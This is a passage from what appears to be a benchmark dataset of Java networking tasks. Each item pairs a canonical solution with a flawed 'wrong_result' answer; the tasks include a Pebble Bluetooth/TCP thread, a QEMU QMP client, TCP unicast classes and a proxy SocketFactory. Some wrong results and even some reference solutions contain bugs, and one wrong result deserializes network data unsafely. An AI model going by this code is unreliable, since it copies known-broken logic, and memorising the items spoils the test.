handleRequest(in);\n                }\n                catch(Exception e) {\n                    Util.close(client_sock);\n                    Util.close(in);\n                }\n            }\n        }\n\n        protected void handleRequest(DataInputStream in) throws Exception {\n            int len=in.readInt();\n            if(len > buf.length)\n                buf=new byte[len];\n            in.readFully(buf, 0, len);\n\n            Message msg=readMessage(buf, 0, len);\n            receive(msg);\n        }\n    }\n\n    protected static Message readMessage(byte[] buf, int offset, int length) throws Exception {\n        ByteArrayDataInputStream in=new ByteArrayDataInputStream(buf, offset, length);\n        short ver=in.readShort();\n        byte flags=in.readByte();\n        Message msg=new BytesMessage();\n        msg.readFrom(in);\n        return msg;\n    }\n\n    public void receive(Message msg) {\n        byte[] buf=msg.getArray();\n        byte   type=buf[msg.getOffset()];\n        System.out.println(\"Received message of type: \" + type);\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 1,
    "wrong_result": "```java\nimport java.net.*;\nimport java.io.*;\nimport java.util.concurrent.locks.Lock;\nimport java.util.concurrent.locks.ReentrantLock;\n\npublic class UnicastTestTcpSlow {\n    private InetSocketAddress local;\n    private InetSocketAddress remote;\n    private Socket sock;\n    private DataOutputStream output;\n    private Lock output_lock;\n    private ServerSocket srv_sock;\n    private Acceptor acceptor;\n\n    public void init(String local_addr, String remote_addr, int local_port, int remote_port) {\n        try {\n            local = new InetSocketAddress(local_addr, local_port);\n            remote = new InetSocketAddress(remote_addr, remote_port);\n            srv_sock = new ServerSocket();\n            srv_sock.bind(local);\n            sock = new Socket();\n            sock.connect(remote);\n            output = new DataOutputStream(sock.getOutputStream());\n            output_lock = new ReentrantLock();\n            acceptor = new Acceptor();\n            acceptor.start();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    public void receive(Message msg) {\n        System.out.println(\"Received message: \" + msg.getType());\n    }\n\n    public static Message readMessage(byte[] buf, int offset, int length) {\n        try {\n            ByteArrayInputStream bis = new ByteArrayInputStream(buf, offset, length);\n            ObjectInputStream ois = new ObjectInputStream(bis);\n            return (Message) ois.readObject();\n        } catch (IOException | ClassNotFoundException e) {\n            e.printStackTrace();\n            return null;\n        }\n    }\n\n    private class Acceptor extends Thread {\n        public void run() {\n            while (true) {\n                try {\n                    Socket client = srv_sock.accept();\n                    DataInputStream in = new DataInputStream(client.getInputStream());\n                    handleRequest(in);\n                } catch (IOException e) {\n                    e.printStackTrace();\n                }\n            }\n        }\n\n        public void handleRequest(DataInputStream in) {\n            try {\n                byte[] buffer = new byte[1024];\n                int bytesRead = in.read(buffer);\n                if (bytesRead > 0) {\n                    Message msg = readMessage(buffer, 0, bytesRead);\n                    receive(msg);\n                }\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 585,
    "Instruction": "Task Description: Create a class that handles both Bluetooth and TCP socket communication for a Pebble device, allowing data transmission and reception through either protocol based on the device address format.\n\nClass Description: The PebbleIoThread class manages connections and data transfer to a Pebble device using either Bluetooth or TCP sockets. It automatically detects the protocol based on the device address format (TCP if address contains one colon, Bluetooth if multiple colons).\n\nAttributes:\n- mIsTCP: [boolean] - Flag indicating whether TCP mode is active\n- mBtAdapter: [BluetoothAdapter] - Android Bluetooth adapter instance\n- mBtSocket: [BluetoothSocket] - Bluetooth socket for communication\n- mTCPSocket: [Socket] - TCP socket for communication\n- mInStream: [InputStream] - Input stream for receiving data\n- mOutStream: [OutputStream] - Output stream for sending data\n- mContext: [Context] - Android application context\n- gbDevice: [GBDevice] - Device information object\n\nMethods:\n- connect(): [boolean] - Establishes connection with the device (returns true if successful)\n  Input: None\n  Output: boolean - Connection success status\n  \n- write_real(byte[] bytes): [void] - Sends data to the connected device with protocol-specific framing\n  Input: byte[] - Data bytes to send\n  Output: None\n  \n- quit(): [void] - Closes all active connections and releases resources\n  Input: None\n  Output: None",
    "Canonical_solution": "import android.bluetooth.BluetoothAdapter;\nimport android.bluetooth.BluetoothDevice;\nimport android.bluetooth.BluetoothSocket;\nimport android.content.Context;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.io.OutputStream;\nimport java.net.InetAddress;\nimport java.net.Socket;\nimport java.util.UUID;\n\nclass PebbleIoThread {\n\n    private boolean mIsTCP = false;\n    private BluetoothAdapter mBtAdapter;\n    private BluetoothSocket mBtSocket;\n    private Socket mTCPSocket;\n    private InputStream mInStream;\n    private OutputStream mOutStream;\n    private Context mContext;\n    private GBDevice gbDevice;\n\n    PebbleIoThread(Context context, GBDevice device, BluetoothAdapter btAdapter) {\n        mContext = context;\n        gbDevice = device;\n        mBtAdapter = btAdapter;\n    }\n\n    protected boolean connect() {\n        String deviceAddress = gbDevice.getAddress();\n        try {\n            int firstColon = deviceAddress.indexOf(\":\");\n            if (firstColon == deviceAddress.lastIndexOf(\":\")) {\n                mIsTCP = true;\n                InetAddress serverAddr = InetAddress.getByName(deviceAddress.substring(0, firstColon));\n                mTCPSocket = new Socket(serverAddr, Integer.parseInt(deviceAddress.substring(firstColon + 1)));\n                mInStream = mTCPSocket.getInputStream();\n                mOutStream = mTCPSocket.getOutputStream();\n            } else {\n                mIsTCP = false;\n                BluetoothDevice btDevice = mBtAdapter.getRemoteDevice(deviceAddress);\n                final UUID UuidSDP = UUID.fromString(\"00001101-0000-1000-8000-00805f9b34fb\");\n                mBtSocket = btDevice.createRfcommSocketToServiceRecord(UuidSDP);\n                mBtSocket.connect();\n                mInStream = mBtSocket.getInputStream();\n                mOutStream = mBtSocket.getOutputStream();\n            }\n            return true;\n        } catch (IOException e) {\n            mInStream = null;\n            mOutStream = null;\n            mBtSocket = null;\n            return false;\n        }\n    }\n\n    private void write_real(byte[] bytes) {\n        try {\n            if (mIsTCP) {\n                ByteBuffer buf = ByteBuffer.allocate(bytes.length + 8);\n                buf.order(ByteOrder.BIG_ENDIAN);\n                buf.putShort((short) 0xfeed);\n                buf.putShort((short) 1);\n                buf.putShort((short) bytes.length);\n                buf.put(bytes);\n                buf.putShort((short) 0xbeef);\n                mOutStream.write(buf.array());\n                mOutStream.flush();\n            } else {\n                mOutStream.write(bytes);\n                mOutStream.flush();\n            }\n        } catch (IOException e) {\n            // Error handling\n        }\n    }\n\n    public void quit() {\n        if (mBtSocket != null) {\n            try {\n                mBtSocket.close();\n            } catch (IOException ignored) {\n            }\n            mBtSocket = null;\n        }\n        if (mTCPSocket != null) {\n            try {\n                mTCPSocket.close();\n            } catch (IOException ignored) {\n            }\n            mTCPSocket = null;\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 1,
    "wrong_result": "```java\npublic class PebbleIoThread {\n    private boolean mIsTCP;\n    private BluetoothAdapter mBtAdapter;\n    private BluetoothSocket mBtSocket;\n    private Socket mTCPSocket;\n    private InputStream mInStream;\n    private OutputStream mOutStream;\n    private Context mContext;\n    private GBDevice gbDevice;\n\n    public PebbleIoThread(Context context, GBDevice device, String address) {\n        mContext = context;\n        gbDevice = device;\n        mIsTCP = address.contains(\":\") && !address.contains(\"::\");\n    }\n\n    public boolean connect() {\n        if (mIsTCP) {\n            try {\n                mTCPSocket = new Socket();\n                mTCPSocket.connect(new InetSocketAddress(gbDevice.getAddress(), 1234), 5000);\n                mInStream = mTCPSocket.getInputStream();\n                mOutStream = mTCPSocket.getOutputStream();\n                return true;\n            } catch (Exception e) {\n                e.printStackTrace();\n                return false;\n            }\n        } else {\n            mBtAdapter = BluetoothAdapter.getDefaultAdapter();\n            BluetoothDevice device = mBtAdapter.getRemoteDevice(gbDevice.getAddress());\n            try {\n                mBtSocket = device.createRfcommSocketToServiceRecord(UUID.fromString(\"0000110A-0000-1000-8000-00805F9B34FB\"));\n                mBtSocket.connect();\n                mInStream = mBtSocket.getInputStream();\n                mOutStream = mBtSocket.getOutputStream();\n                return true;\n            } catch (Exception e) {\n                e.printStackTrace();\n                return false;\n            }\n        }\n    }\n\n    public void write_real(byte[] bytes) {\n        if (mIsTCP) {\n            try {\n                mOutStream.write(bytes);\n                mOutStream.flush();\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        } else {\n            try {\n                mOutStream.write(bytes);\n                mOutStream.flush();\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n\n    public void quit() {\n        try {\n            if (mInStream != null) {\n                mInStream.close();\n            }\n            if (mOutStream != null) {\n                mOutStream.close();\n            }\n            if (mTCPSocket != null) {\n                mTCPSocket.close();\n            }\n            if (mBtSocket != null) {\n                mBtSocket.close();\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 586,
    "Instruction": "Task Description: Implement a QMP (QEMU Machine Protocol) client class that can communicate with a QEMU instance either through a local Unix domain socket or a TCP socket, depending on configuration. The client should be able to send commands and receive responses from the QEMU monitor interface.\n\nClass Description: The QmpClient class provides functionality to connect to a QEMU instance via QMP protocol, send commands, and receive responses. It supports both local Unix domain sockets (for local QEMU instances) and TCP sockets (for remote QEMU instances). The class handles connection establishment, command sending, response parsing, and resource cleanup.\n\nAttributes:\n- TAG: String - A constant for logging purposes\n- requestCommandMode: String - The initial QMP capabilities request command\n- external: boolean - Flag indicating whether to use external TCP connection (true) or local Unix socket (false)\n\nMethods:\n- setExternal(boolean value) -> void - Sets the connection mode (TCP socket or local Unix socket)\n- sendCommand(String command) -> String - Sends a QMP command and returns the response\n- tryGetResponse(BufferedReader in) -> String - Attempts to get a response with retries\n- sendRequest(PrintWriter out, String request) -> void - Sends a request to the QEMU monitor\n- getResponse(BufferedReader in) -> String - Reads and parses the response from QEMU monitor",
    "Canonical_solution": "import android.net.LocalSocket;\nimport android.net.LocalSocketAddress;\nimport android.util.Log;\n\nimport com.max2idea.android.limbo.main.Config;\nimport com.max2idea.android.limbo.main.LimboApplication;\n\nimport org.json.JSONObject;\n\nimport java.io.BufferedReader;\nimport java.io.IOException;\nimport java.io.InputStreamReader;\nimport java.io.PrintWriter;\nimport java.net.Socket;\n\npublic class QmpClient {\n\n    private static final String TAG = \"QmpClient\";\n    private static final String requestCommandMode = \"{ \\\"execute\\\": \\\"qmp_capabilities\\\" }\";\n    private static boolean external = false;\n\n    public static void setExternal(boolean value) {\n        external = value;\n    }\n\n    public synchronized static String sendCommand(String command) {\n        String response = null;\n        Socket pingSocket = null;\n        LocalSocket localSocket = null;\n        PrintWriter out = null;\n        BufferedReader in = null;\n\n        try {\n            if(external) {\n                pingSocket = new Socket(Config.QMPServer, Config.QMPPort);\n                pingSocket.setSoTimeout(5000);\n                out = new PrintWriter(pingSocket.getOutputStream(), true);\n                in = new BufferedReader(new InputStreamReader(pingSocket.getInputStream()));\n            } else {\n                localSocket = new LocalSocket();\n                String localQMPSocketPath = LimboApplication.getLocalQMPSocketPath();\n                LocalSocketAddress localSocketAddr = new LocalSocketAddress(localQMPSocketPath, LocalSocketAddress.Namespace.FILESYSTEM);\n                localSocket.connect(localSocketAddr);\n                localSocket.setSoTimeout(5000);\n                out = new PrintWriter(localSocket.getOutputStream(), true);\n                in = new BufferedReader(new InputStreamReader(localSocket.getInputStream()));\n            }\n            sendRequest(out, QmpClient.requestCommandMode);\n            response = tryGetResponse(in);\n            sendRequest(out, command);\n            response = tryGetResponse(in);\n        } catch (Exception e) {\n            e.printStackTrace();\n        } finally {\n            if (out != null)\n                out.close();\n            try {\n                if (in != null)\n                    in.close();\n                if (pingSocket != null)\n                    pingSocket.close();\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n        if(Config.debugQmp)\n            Log.d(TAG, \"Response: \" + response);\n        return response;\n    }\n\n    private static String tryGetResponse(BufferedReader in) throws Exception {\n        String response = null;\n        int trial = 0;\n        while((response = getResponse(in)).equals(\"\") && trial < 3){\n            Thread.sleep(1000);\n            trial++;\n        }\n        return response;\n    }\n\n    private static void sendRequest(PrintWriter out, String request) {\n        if(Config.debugQmp)\n            Log.d(TAG, \"QMP request\" + request);\n        out.println(request);\n    }\n\n    private static String getResponse(BufferedReader in) throws Exception {\n        String line;\n        StringBuilder stringBuilder = new StringBuilder(\"\");\n        try {\n            do {\n                line = in.readLine();\n                if (line != null) {\n                    if(Config.debugQmp)\n                        Log.d(TAG, \"QMP response: \" + line);\n                    JSONObject object = new JSONObject(line);\n                    String returnStr = null;\n                    String errStr = null;\n\n                    try {\n                        if(line.contains(\"return\"))\n                            returnStr = object.getString(\"return\");\n                    } catch (Exception ex) {\n                        if(Config.debugQmp)\n                            ex.printStackTrace();\n                    }\n\n                    if (returnStr != null) {\n                        stringBuilder.append(line);\n                        stringBuilder.append(\"\\n\");\n                        break;\n                    }\n\n                    try {\n                        if(line.contains(\"error\"))\n                            errStr = object.getString(\"error\");\n                    } catch (Exception ex) {\n                        if(Config.debugQmp)\n                            ex.printStackTrace();\n                    }\n                    stringBuilder.append(line);\n                    stringBuilder.append(\"\\n\");\n                    if (errStr != null) {\n                        break;\n                    }\n                } else\n                    break;\n            } while (true);\n        } catch (Exception ex) {\n            Log.e(TAG, \"Could not get Response: \" + ex.getMessage());\n            if(Config.debugQmp)\n                ex.printStackTrace();\n        }\n        return stringBuilder.toString();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 1,
    "wrong_result": "{\"TAG\": \"QmpClient\", \"requestCommandMode\": \"{\\\"execute\\\": \\\"qmp_capabilities\\\"}\", \"external\": false, \"setExternal\": \"void setExternal(boolean value) { this.external = value; }\", \"sendCommand\": \"String sendCommand(String command) { try { Socket socket = external ? new Socket(\\\"localhost\\\", 4444) : new UnixSocket(\\\"/tmp/qemu-monitor.sock\\\"); PrintWriter out = new PrintWriter(socket.getOutputStream(), true); BufferedReader in = new BufferedReader(new InputStreamReader(socket.getInputStream())); sendRequest(out, requestCommandMode); String response = getResponse(in); if (response != null && !response.isEmpty()) { sendRequest(out, command); return getResponse(in); } } catch (Exception e) { e.printStackTrace(); } return \\\"Error\\\"; }\", \"tryGetResponse\": \"String tryGetResponse(BufferedReader in) { for (int i = 0; i < 5; i++) { try { String line = in.readLine(); if (line != null && !line.isEmpty()) { return line; } Thread.sleep(100); } catch (Exception e) { e.printStackTrace(); } } return \\\"Timeout\\\"; }\", \"sendRequest\": \"void sendRequest(PrintWriter out, String request) { out.println(request); }\", \"getResponse\": \"String getResponse(BufferedReader in) { try { String line; while ((line = in.readLine()) != null) { if (line.contains(\\\"{\\\\\\\"return\\\\\\\":\\\")) { return line; } } } catch (Exception e) { e.printStackTrace(); } return \\\"No response\\\"; }\"}"
  },
  {
    "Task_id": 587,
    "Instruction": "Task Description: Implement a TCP-based unicast communication class that enables message exchange between a client and server, supporting both sending and receiving of messages with proper resource management.\n\nClass Description: UnicastTestTcp is a class that establishes TCP connections for unicast communication between two endpoints. It acts as both a client (connecting to a remote server) and a server (accepting connections from remote clients). The class handles message serialization/deserialization and provides thread-safe operations for sending messages.\n\nAttributes:\n- local: InetSocketAddress - The local address and port for server socket binding\n- remote: InetSocketAddress - The remote address and port for client connection\n- sock: Socket - The client socket for outgoing connections\n- output: DataOutputStream - The output stream for sending data to the remote endpoint\n- output_lock: Lock - A reentrant lock for thread-safe output operations\n- srv_sock: ServerSocket - The server socket for accepting incoming connections\n- acceptor: Acceptor - A thread that handles incoming connections\n\nMethods:\n- init(String local_addr, String remote_addr, int local_port, int remote_port) -> void - Initializes the communication by setting up both server and client sockets. Throws Exception if initialization fails.\n- writeMessage(Message msg, DataOutputStream out) -> static void - Serializes and writes a message to the output stream. Throws Exception if writing fails.\n- readMessage(DataInput in) -> static Message - Reads and deserializes a message from the input stream. Throws Exception if reading fails.\n- receive(Message msg) -> void - Processes received messages based on their type (START or DATA)\n\nNested Class:\n- Acceptor: Thread - Handles incoming connections and message processing\n  Methods:\n  - run() -> void - Continuously accepts new connections and processes incoming messages\n  - handleRequest(DataInputStream in) -> void - Reads and processes individual messages from an established connection. Throws Exception if processing fails.",
    "Canonical_solution": "import org.jgroups.*;\nimport org.jgroups.stack.IpAddress;\nimport org.jgroups.util.DefaultSocketFactory;\nimport org.jgroups.util.Util;\n\nimport java.io.*;\nimport java.net.InetSocketAddress;\nimport java.net.ServerSocket;\nimport java.net.Socket;\nimport java.nio.ByteBuffer;\nimport java.util.concurrent.atomic.AtomicLong;\nimport java.util.concurrent.locks.Lock;\nimport java.util.concurrent.locks.ReentrantLock;\n\npublic class UnicastTestTcp {\n    protected InetSocketAddress local, remote;\n    protected Socket sock;\n    protected DataOutputStream output;\n    protected final Lock output_lock = new ReentrantLock();\n    protected ServerSocket srv_sock;\n    protected Acceptor acceptor;\n\n    protected static final boolean TCP_NODELAY = false;\n    protected static final int SOCK_SEND_BUF_SIZE = 200 * 1000;\n    protected static final int SOCK_RECV_BUF_SIZE = 200 * 1000;\n    protected static final byte START = 1;\n    protected static final byte DATA = 2;\n\n    public void init(String local_addr, String remote_addr, int local_port, int remote_port) throws Exception {\n        local = new InetSocketAddress(local_addr, local_port);\n        remote = new InetSocketAddress(remote_addr, remote_port);\n        srv_sock = Util.createServerSocket(new DefaultSocketFactory(), \"server\", local.getAddress(),\n                                         local.getPort(), local.getPort(), 0);\n        System.out.println(\"Listening on \" + srv_sock.getLocalSocketAddress());\n        acceptor = new Acceptor();\n        acceptor.start();\n\n        sock = new Socket();\n        sock.setSendBufferSize(SOCK_SEND_BUF_SIZE);\n        sock.setReceiveBufferSize(SOCK_RECV_BUF_SIZE);\n        try {\n            sock.connect(remote);\n            output = new DataOutputStream(new BufferedOutputStream(sock.getOutputStream()));\n            System.out.println(\"Connected to \" + sock.getRemoteSocketAddress());\n        }\n        catch(Throwable t) {\n            System.out.println(\"Failed connecting to \" + remote + \": will only act as server\");\n        }\n    }\n\n    protected static final void writeMessage(final Message msg, DataOutputStream out) throws Exception {\n        byte flags = 0;\n        if(msg.getDest() == null)\n            flags += (byte)2;\n        out.writeShort(Version.version);\n        out.writeByte(flags);\n        msg.writeTo(out);\n    }\n\n    protected static final Message readMessage(DataInput in) throws Exception {\n        short ver = in.readShort();\n        byte flags = in.readByte();\n        Message msg = new BytesMessage();\n        msg.readFrom(in);\n        return msg;\n    }\n\n    protected class Acceptor extends Thread {\n        public void run() {\n            while(!srv_sock.isClosed()) {\n                Socket client_sock = null;\n                DataInputStream in = null;\n                try {\n                    client_sock = srv_sock.accept();\n                    client_sock.setTcpNoDelay(TCP_NODELAY);\n                    client_sock.setReceiveBufferSize(SOCK_RECV_BUF_SIZE);\n                    client_sock.setSendBufferSize(SOCK_SEND_BUF_SIZE);\n                    in = new DataInputStream(new BufferedInputStream(client_sock.getInputStream()));\n                    while(!client_sock.isClosed())\n                        handleRequest(in);\n                }\n                catch(Exception e) {\n                    Util.close(client_sock);\n                    Util.close(in);\n                }\n            }\n        }\n\n        protected void handleRequest(DataInputStream in) throws Exception {\n            Message msg = readMessage(in);\n            receive(msg);\n        }\n    }\n\n    public void receive(Message msg) {\n        byte[] buf = msg.getArray();\n        byte type = buf[msg.getOffset()];\n\n        switch(type) {\n            case START:\n                ByteBuffer tmp = ByteBuffer.wrap(buf, 1+msg.getOffset(), Global.LONG_SIZE);\n                int num_msgs = (int)tmp.getLong();\n                System.out.println(\"Received START message with \" + num_msgs + \" messages\");\n                break;\n            case DATA:\n                System.out.println(\"Received DATA message\");\n                break;\n            default:\n                System.err.println(\"Type \" + type + \" is invalid\");\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 1,
    "wrong_result": "```java\nimport java.net.*;\nimport java.io.*;\nimport java.util.concurrent.locks.ReentrantLock;\n\npublic class UnicastTestTcp {\n    private InetSocketAddress local;\n    private InetSocketAddress remote;\n    private Socket sock;\n    private DataOutputStream output;\n    private ReentrantLock output_lock;\n    private ServerSocket srv_sock;\n    private Acceptor acceptor;\n\n    public void init(String local_addr, String remote_addr, int local_port, int remote_port) throws Exception {\n        local = new InetSocketAddress(local_addr, local_port);\n        remote = new InetSocketAddress(remote_addr, remote_port);\n        sock = new Socket();\n        sock.connect(remote);\n        output = new DataOutputStream(sock.getOutputStream());\n        output_lock = new ReentrantLock();\n        srv_sock = new ServerSocket();\n        srv_sock.bind(local);\n        acceptor = new Acceptor();\n        acceptor.start();\n    }\n\n    public static void writeMessage(Message msg, DataOutputStream out) throws Exception {\n        byte[] data = msg.serialize();\n        out.writeInt(data.length);\n        out.write(data);\n    }\n\n    public static Message readMessage(DataInput in) throws Exception {\n        int length = in.readInt();\n        byte[] data = new byte[length];\n        in.readFully(data);\n        return Message.deserialize(data);\n    }\n\n    public void receive(Message msg) {\n        if (msg.getType() == Message.Type.START) {\n            // Handle START message\n        } else if (msg.getType() == Message.Type.DATA) {\n            // Handle DATA message\n        }\n    }\n\n    private class Acceptor extends Thread {\n        public void run() {\n            try {\n                while (!Thread.currentThread().isInterrupted()) {\n                    Socket client = srv_sock.accept();\n                    DataInputStream in = new DataInputStream(client.getInputStream());\n                    handleRequest(in);\n                }\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n\n        public void handleRequest(DataInputStream in) throws Exception {\n            Message msg = readMessage(in);\n            receive(msg);\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 589,
    "Instruction": "Task Description: Create a custom SocketFactory implementation that supports both direct connections and proxy connections (SOCKS and HTTP) with optional authentication for HTTP proxies.\n\nClass Description: CustomSocketFactory is a SocketFactory subclass that provides socket creation capabilities with proxy support. It handles both direct connections and connections through SOCKS or HTTP proxies, including HTTP proxy authentication when required.\n\nAttributes:\n- proxyHost: String - The hostname or IP address of the proxy server\n- proxyPort: int - The port number of the proxy server\n- proxyUser: String - The username for proxy authentication (optional)\n- proxyPass: String - The password for proxy authentication (optional)\n- proxyType: Proxy.Type - The type of proxy (SOCKS or HTTP)\n\nMethods:\n- createSocket(String host, int port) -> Socket - Creates a socket connected to the specified host and port\n- createSocket(String host, int port, InetAddress localHost, int localPort) -> Socket - Creates a socket connected to the specified host and port, binding to the specified local address and port\n- createSocket(InetAddress host, int port) -> Socket - Creates a socket connected to the specified InetAddress and port\n- createSocket(InetAddress address, int port, InetAddress localAddress, int localPort) -> Socket - Creates a socket connected to the specified InetAddress and port, binding to the specified local address and port\n- createSocket() -> Socket - Creates an unconnected socket with proxy configuration\n- connectToProxy(Socket socket) -> void - Handles HTTP proxy connection and authentication (private method)\n- getBasicAuthStr() -> String - Generates Base64 encoded proxy authentication string (private method)\n- readLine(InputStream in) -> String - Reads a line from the input stream (private method)\n- getResponseCode(String statusLine) -> int - Extracts HTTP response code from status line (private static method)",
    "Canonical_solution": "import java.io.IOException;\nimport java.io.InputStream;\nimport java.io.OutputStream;\nimport java.io.UnsupportedEncodingException;\nimport java.net.InetAddress;\nimport java.net.InetSocketAddress;\nimport java.net.Proxy;\nimport java.net.Socket;\nimport java.net.UnknownHostException;\nimport java.util.Base64;\nimport javax.net.SocketFactory;\n\npublic class CustomSocketFactory extends SocketFactory {\n\n    private String proxyHost, proxyUser, proxyPass;\n    private int proxyPort;\n    private Proxy.Type proxyType;\n\n    public CustomSocketFactory(String proxyHost, int proxyPort,\n            String proxyUser, String proxyPass, Proxy.Type proxyType) {\n        this.proxyHost = proxyHost;\n        this.proxyPort = proxyPort;\n        this.proxyUser = proxyUser;\n        this.proxyPass = proxyPass;\n        this.proxyType = proxyType;\n    }\n\n    @Override\n    public Socket createSocket(String host, int port)\n            throws IOException, UnknownHostException {\n        return this.createSocket(InetAddress.getByName(host), port);\n    }\n\n    @Override\n    public Socket createSocket(String host, int port, InetAddress localHost,\n            int localPort) throws IOException, UnknownHostException {\n        return this.createSocket(InetAddress.getByName(host), port, localHost,\n                localPort);\n    }\n\n    @Override\n    public Socket createSocket(InetAddress host, int port) throws IOException {\n        return this.createSocket(host, port, null, 0);\n    }\n\n    @Override\n    public Socket createSocket(InetAddress address, int port,\n            InetAddress localAddress, int localPort) throws IOException {\n        Socket socket = this.createSocket();\n        if (localAddress != null) {\n            socket.bind(new InetSocketAddress(localAddress, localPort));\n        }\n        if (address != null) {\n            socket.connect(new InetSocketAddress(address, port));\n        }\n\n        if (this.proxyType == Proxy.Type.HTTP && proxyUser != null) {\n            connectToProxy(socket);\n        }\n\n        return socket;\n    }\n\n    @Override\n    public Socket createSocket() throws IOException {\n        Proxy proxy = Proxy.NO_PROXY;\n        if (this.proxyType == Proxy.Type.SOCKS) {\n            proxy = new Proxy(Proxy.Type.SOCKS,\n                    new InetSocketAddress(proxyHost, proxyPort));\n        } else if (this.proxyType == Proxy.Type.HTTP) {\n            if (proxyUser == null || proxyUser.length() < 1) {\n                proxy = new Proxy(Proxy.Type.HTTP,\n                        new InetSocketAddress(proxyHost, proxyPort));\n            }\n        }\n\n        Socket socket = new Socket(proxy);\n        return socket;\n    }\n\n    private void connectToProxy(Socket socket) throws IOException {\n        InputStream in = socket.getInputStream();\n        OutputStream out = socket.getOutputStream();\n        StringBuilder requestHeaders = new StringBuilder();\n        requestHeaders\n                .append(\"HTTP \" + proxyHost + \":\" + proxyPort + \" HTTP/1.1\\r\\n\")\n                .append(\"Host: \" + proxyHost + \":\" + proxyPort + \"\\r\\n\");\n        String proxyAuth = getBasicAuthStr();\n        if (proxyAuth != null) {\n            requestHeaders\n                    .append(\"Proxy-Authorization: basic \" + proxyAuth + \"\\r\\n\");\n        }\n        requestHeaders.append(\"\\r\\n\");\n        out.write(requestHeaders.toString().getBytes(\"utf-8\"));\n        out.flush();\n\n        String statusLine = readLine(in);\n        if (statusLine == null) {\n            socket.close();\n            throw new IOException(\"Proxy sent blank response\");\n        }\n\n        int responseCode = getResponseCode(statusLine);\n        if (responseCode < 200 && responseCode >= 300) {\n            socket.close();\n            throw new IOException(\"Invalid response code: \" + responseCode);\n        }\n\n        while (true) {\n            String line = readLine(in);\n            if (line.length() < 1)\n                break;\n        }\n    }\n\n    private String getBasicAuthStr() {\n        if (proxyUser != null && proxyUser.length() > 0) {\n            try {\n                return (Base64.getEncoder().encodeToString(\n                        (proxyUser + \":\" + (proxyPass == null ? \"\" : proxyPass))\n                                .getBytes(\"utf-8\")));\n            } catch (UnsupportedEncodingException e) {\n                e.printStackTrace();\n            }\n        }\n        return null;\n    }\n\n    public final String readLine(InputStream in) throws IOException {\n        StringBuilder buf = new StringBuilder();\n        while (true) {\n            int x = in.read();\n            if (x == -1)\n                throw new IOException(\n                        \"Unexpected EOF while reading header line\");\n            if (x == '\\n')\n                return buf.toString();\n            if (x != '\\r')\n                buf.append((char) x);\n        }\n    }\n\n    public static final int getResponseCode(String statusLine) {\n        String arr[] = statusLine.split(\" \");\n        if (arr.length < 2)\n            return 400;\n        return Integer.parseInt(arr[1]);\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 1,
    "wrong_result": "```java\nimport java.io.*;\nimport java.net.*;\nimport java.util.Base64;\n\npublic class CustomSocketFactory extends SocketFactory {\n    private String proxyHost;\n    private int proxyPort;\n    private String proxyUser;\n    private String proxyPass;\n    private Proxy.Type proxyType;\n\n    public CustomSocketFactory(String proxyHost, int proxyPort, String proxyUser, String proxyPass, Proxy.Type proxyType) {\n        this.proxyHost = proxyHost;\n        this.proxyPort = proxyPort;\n        this.proxyUser = proxyUser;\n        this.proxyPass = proxyPass;\n        this.proxyType = proxyType;\n    }\n\n    @Override\n    public Socket createSocket(String host, int port) throws IOException {\n        Socket socket = new Socket();\n        connectToProxy(socket);\n        socket.connect(new InetSocketAddress(host, port));\n        return socket;\n    }\n\n    @Override\n    public Socket createSocket(String host, int port, InetAddress localHost, int localPort) throws IOException {\n        Socket socket = new Socket(localHost, localPort);\n        connectToProxy(socket);\n        socket.connect(new InetSocketAddress(host, port));\n        return socket;\n    }\n\n    @Override\n    public Socket createSocket(InetAddress host, int port) throws IOException {\n        Socket socket = new Socket();\n        connectToProxy(socket);\n        socket.connect(new InetSocketAddress(host, port));\n        return socket;\n    }\n\n    @Override\n    public Socket createSocket(InetAddress address, int port, InetAddress localAddress, int localPort) throws IOException {\n        Socket socket = new Socket(localAddress, localPort);\n        connectToProxy(socket);\n        socket.connect(new InetSocketAddress(address, port));\n        return socket;\n    }\n\n    @Override\n    public Socket createSocket() throws IOException {\n        Socket socket = new Socket();\n        connectToProxy(socket);\n        return socket;\n    }\n\n    private void connectToProxy(Socket socket) throws IOException {\n        if (proxyType == Proxy.Type.SOCKS) {\n            socket.connect(new InetSocketAddress(proxyHost, proxyPort));\n        } else if (proxyType == Proxy.Type.HTTP) {\n            socket.connect(new InetSocketAddress(proxyHost, proxyPort));\n            connectToHttpProxy(socket);\n        }\n    }\n\n    private void connectToHttpProxy(Socket socket) throws IOException {\n        OutputStream out = socket.getOutputStream();\n        String request = \"CONNECT \" + socket.getInetAddress().getHostName() + \":\" + socket.getPort() + \" HTTP/1.1\\r\\n\";\n        request += \"Host: \" + socket.getInetAddress().getHostName() + \":\" + socket.getPort() + \"\\r\\n\";\n        if (proxyUser != null && proxyPass != null) {\n            String authStr = getBasicAuthStr();\n            request += \"Proxy-Authorization: Basic \" + authStr + \"\\r\\n\";\n        }\n        request += \"\\r\\n\";\n        out.write(request.getBytes());\n        out.flush();\n\n        InputStream in = socket.getInputStream();\n        String statusLine = readLine(in);\n        int responseCode = getResponseCode(statusLine);\n\n        if (responseCode != 200) {\n            throw new IOException(\"HTTP proxy connection failed with response code: \" + responseCode);\n        }\n    }\n\n    private String getBasicAuthStr() {\n        String auth = proxyUser + \":\" + proxyPass;\n        return Base64.getEncoder().encodeToString(auth.getBytes());\n    }\n\n    private String readLine(InputStream in) throws IOException {\n        StringBuilder sb = new StringBuilder();\n        int c;\n        while ((c = in.read()) != -1) {\n            if (c == '\\n') {\n                break;\n            }\n            sb.append((char) c);\n        }\n        return sb.toString();\n    }\n\n    private static int getResponseCode(String statusLine) {\n        if (statusLine == null || statusLine.isEmpty()) {\n            return -1;\n        }\n        String[] parts = 